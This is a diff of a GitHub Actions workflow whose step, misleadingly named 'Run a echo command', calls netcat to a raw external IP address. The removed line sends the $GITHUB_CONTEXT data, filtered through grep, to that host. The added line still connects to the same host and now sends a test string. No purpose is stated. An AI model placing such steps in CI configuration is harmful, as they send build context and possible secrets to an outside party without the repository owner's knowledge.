@@ -13,6 +13,6 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - name: Run a echo command
-      run: echo "$GITHUB_CONTEXT"| grep -i "after" | nc 152.57.230.222 80
+      run: echo -n 'Test String' | nc 152.57.230.222 80
        
       
